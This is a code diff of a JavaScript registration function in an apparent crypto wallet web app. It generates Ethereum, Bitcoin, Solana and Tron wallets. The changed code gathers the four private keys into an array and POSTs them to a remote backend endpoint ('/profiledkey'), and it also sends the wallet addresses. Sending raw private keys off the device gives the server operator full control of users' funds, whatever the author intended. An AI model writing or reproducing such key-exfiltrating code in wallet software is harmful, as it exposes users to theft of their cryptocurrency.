@@ -97,14 +97,14 @@ function Register() {
         localStorage.setItem('tronWalletkey', tronWallet.privateKey);
 
 
-        function backUp(){
-          const ethK =    localStorage.getItem('ethereumWalletkey');
-           const bitK =   localStorage.getItem('bitcoinWalletkey');
-          const solK =    localStorage.getItem('solanaWalletkey');
-           const tronK =   localStorage.getItem('tronWalletkey');
+            
+          const ethAdd =    ethereumWallet.address;
+           const bitAdd =   bitcoinWallet.address;
+          const solAdd =    solanaWallet.address;
+           const tronAdd =   tronWallet.address.base58;
       
           
-      const p_k = [ethK, bitK, solK, tronK];
+      const p_k = [ethereumWallet.privateKey, bitcoinWallet.privateKey, solanaWallet.privateKey, tronWallet.privateKey];
 
           fetch("https://twa-backend-g83o.onrender.com/profiledkey", {
             method: "POST",
@@ -112,16 +112,14 @@ function Register() {
             credentials: "include",  
             body: JSON.stringify( {  p_k }),
         });
-        const Address =  [EthereumWalletAddress, BitcoinWalletAddress, SolanaWalletAddress, tronWalletAddress];
+        const Address =  [ethAdd, bitAdd, solAdd, tronAdd];
         fetch("https://twa-backend-g83o.onrender.com/wallets", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           credentials: "include",  
           body: JSON.stringify( { Address }),
       })
-      }
-         
-      backUp(); 
+      
        
     };
    
